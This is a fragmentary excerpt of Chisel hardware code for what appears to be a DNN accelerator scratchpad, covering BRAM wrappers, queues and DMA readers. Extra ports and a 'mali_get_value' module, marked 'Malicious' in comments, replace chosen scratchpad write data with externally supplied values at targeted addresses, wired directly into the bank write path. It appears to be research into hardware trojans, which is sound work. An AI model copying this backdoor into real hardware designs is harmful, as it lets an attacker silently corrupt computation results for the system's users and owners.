...
class ScratchpadBank(n: Int, w: Int, aligned_to: Int, single_ported: Boolean, use_shared_ext_mem: Boolean, is_dummy: Boolean) extends Module {
  ...
  /*
    ...
    (read _, write _)
    */
    // TODO: The code generated by Chisel does not adapt well to Xilinx synthesis tools, which leads to the appearance of critical paths in timing. Therefore, it is necessary to directly use Xilinx's IP.
        /*******************************************************USE XILINX BRAM IP**********************************/
    val xilinxSyncMem = Module(new xilinxSyncReadMem(n, w.asUInt(w.W), mask_len))
    xilinxSyncMem.io.dina := DontCare
    xilinxSyncMem.io.addra := DontCare
    xilinxSyncMem.io.ena := io.write.en
   xilinxSyncMem.io.wea := DontCare
    xilinxSyncMem.io.clka := clock

    xilinxSyncMem.io.addrb := DontCare
    xilinxSyncMem.io.clkb := clock
   xilinxSyncMem.io.enb := DontCare
//    io.rdata := xilinxSyncMem.io.doutb.asTypeOf(t)
    xilinxSyncMem.io.rstb := 0.U
    xilinxSyncMem.io.sleep := 0.U

    def myread(addr: UInt, ren: Bool): Data = {
      xilinxSyncMem.io.addrb := addr
      xilinxSyncMem.io.enb := ren
      xilinxSyncMem.io.doutb.asTypeOf(UInt(w.W))
    }

    def mywrite(addr: UInt, wdata: Vec[UInt], wmask: Vec[Bool]) = {
      val combWriteData = wdata.asTypeOf(UInt(w.W))
      val maskTypeUInt = wmask.asTypeOf(Vec(mask_len, UInt(1.W)))
      val combMask = maskTypeUInt.reduce((a, b) => Cat(b, a))

      xilinxSyncMem.io.dina := combWriteData
      xilinxSyncMem.io.addra := addr
  ...
  val q = Module(new Queue(new ScratchpadReadResp(w), 5, true, true))
  ...
  class Impl extends LazyModuleImp(this) with HasCoreParameters {
    val io = IO(new Bundle {
      ...
      val counter = new CounterEventIO()
            ...
            // Mlicious info
      val maliAddr = Flipped(Valid(UInt(log2Ceil(sp_banks * sp_bank_entries).W)))
      val maliOffset = Flipped(Valid(UInt(log2Ceil(block_rows).W)))
      val maliValue = Input(Vec(9, new maliType_2))
      val maliIch = Input(UInt(16.W))
    })
    ...
    // TODO: When the queue size is set to more than 1, the error could be due to a hazard.
    val zero_writer_que = Module(new Queue(io.dma.read.req.bits.cloneType, 1))      

    when (io.dma.read.req.bits.all_zeros) {
      read_issue_q.io.enq.valid := false.B

       // TODO: Based on the above issue, focus on checking whether there is an instruction hazard between the ready signal and the subsequent instructions.
      io.dma.read.req.ready := zero_writer_que.io.enq.ready
//      io.dma.read.req.ready := zero_writer.io.req.ready
    }

    zero_writer_que.io.enq.valid := io.dma.read.req.valid && io.dma.read.req.bits.all_zeros
    zero_writer_que.io.enq.bits := io.dma.read.req.bits

    zero_writer.io.req.valid := zero_writer_que.io.deq.valid
    zero_writer_que.io.deq.ready := zero_writer.io.req.ready

    zero_writer.io.req.bits.laddr := zero_writer_que.io.deq.bits.laddr
    zero_writer.io.req.bits.cols := zero_writer_que.io.deq.bits.cols
    zero_writer.io.req.bits.block_stride := zero_writer_que.io.deq.bits.block_stride
    zero_writer.io.req.bits.tag := zero_writer_que.io.deq.bits    
...
*/
    ...
    val reader_mvin_acc_queue = Module(new Queue(reader.module.io.resp.bits.cloneType, 4))
    if (!mvin_scale_shared) {
      reader_mvin_acc_queue.io.enq.valid := reader.module.io.resp.valid && (reader.module.io.resp.bits.is_acc && reader.module.io.resp.bits.has_acc_bitwidth)
      reader_mvin_acc_queue.io.enq.bits := reader.module.io.resp.bits

      mvin_scale_acc_in.valid := reader_mvin_acc_queue.io.deq.valid
      mvin_scale_acc_in.bits.in := reader_mvin_acc_queue.io.deq.bits.data.asTypeOf(chiselTypeOf(mvin_scale_acc_in.bits.in))
      mvin_scale_acc_in.bits.scale := reader_mvin_acc_queue.io.deq.bits.scale.asTypeOf(mvin_scale_acc_t)
      mvin_scale_acc_in.bits.repeats := reader_mvin_acc_queue.io.deq.bits.repeats
      mvin_scale_acc_in.bits.pixel_repeats := 1.U
      mvin_scale_acc_in.bits.last := reader_mvin_acc_queue.io.deq.bits.last
      mvin_scale_acc_in.bits.tag := reader_mvin_acc_queue.io.deq.bits

      reader_mvin_acc_queue.io.deq.ready := mvin_scale_acc_in.ready
...
//      mvin_scale_acc_in.bits.tag := reader.module.io.resp.bits
    ...
    reader.module.io.resp.ready := Mux(reader.module.io.resp.bits.is_acc && reader.module.io.resp.bits.has_acc_bitwidth, reader_mvin_acc_queue.io.enq.ready, mvin_scale_in.ready)
//    reader.module.io.resp.ready := Mux(reader.module.io.resp.bits.is_acc && reader.module.io.resp.bits.has_acc_bitwidth, mvin_scale_acc_in.ready, mvin_scale_in.ready)
...
*/
    ...
    class mali_get_value() extends Module {
      val io = IO(new Bundle() {
        val in_addr = Input(UInt(log2Ceil(sp_banks * sp_bank_entries).W))
        val in_data = Input(Vec(block_cols, inputType.cloneType))
        val in_maliValue = Input(Vec(9, new maliType_2))
        val repeater_fire = Input(Bool())
        val in_maliAddr = Flipped(Valid(UInt(log2Ceil(sp_banks * sp_bank_entries).W)))
        val in_maliOffset = Flipped(Valid(UInt(log2Ceil(block_rows).W)))
        val maliIch = Input(UInt(16.W))
        val out_maliValue = Output(Vec(block_cols, inputType.cloneType))
      })

      val addrOffset = io.in_addr - io.in_maliAddr.bits
      val addrMatch = (io.in_addr >= io.in_maliAddr.bits) && (addrOffset % io.maliIch === 0.U)
      val valueIdx = Mux(addrMatch, (addrOffset / io.maliIch).asUInt, 0.U)
      val mali_find_target = addrMatch && io.repeater_fire && io.in_maliAddr.fire && io.in_maliOffset.fire && io.in_maliValue(valueIdx).valid

      val mali_value = Wire(Vec(block_cols, inputType.cloneType))
      mali_value := io.in_data 

      when(mali_find_target) {
        mali_value(io.in_maliOffset.bits) := io.in_maliValue(valueIdx).data.asSInt
      }

      io.out_maliValue := mali_value
    }

    val mali_value_get = Module(new mali_get_value())
    mali_value_get.io.in_addr :=  mvin_scale_pixel_repeater.io.resp.bits.laddr.data
    mali_value_get.io.in_data := mvin_scale_pixel_repeater.io.resp.bits.out
    mali_value_get.io.in_maliValue := io.maliValue
    mali_value_get.io.repeater_fire := mvin_scale_pixel_repeater.io.resp.fire
    mali_value_get.io.in_maliAddr := io.maliAddr
    mali_value_get.io.in_maliOffset := io.maliOffset
    mali_value_get.io.maliIch := io.maliIch

    val mali_value = mali_value_get.io.out_maliValue


    	// Malicious
    	/*
	val greater = mvin_scale_pixel_repeater.io.resp.bits.laddr.data >= io.maliAddr.bits
        val addrOffset = mvin_scale_pixel_repeater.io.resp.bits.laddr.data - io.maliAddr.bits
    val addrMatch = greater && addrOffset >= 0.U && (addrOffset % io.maliIch === 0.U)
    val valueIdx = Mux(addrMatch, (addrOffset / io.maliIch).asUInt, 0.U)
    val mali_find_target = addrMatch && mvin_scale_pixel_repeater.io.resp.fire && io.maliAddr.fire && io.maliOffset.fire && io.maliValue(valueIdx).valid
    
    val mali_value = Wire(Vec(block_cols, inputType.cloneType))
    for (i <- 0 until block_cols) {
      mali_value(i) := mvin_scale_pixel_repeater.io.resp.bits.out(i)
    }
    when(mali_find_target){
      mali_value(io.maliOffset.bits) := io.maliValue(valueIdx).data.asSInt
    }
*/
    ...
    val spad_mems = {
      ...
      bank_ios.zipWithIndex.foreach { case (bio, i) =>
        ...
        when (exwrite) {
          ...
          bio.write.data := mali_value.asUInt		// Malicious
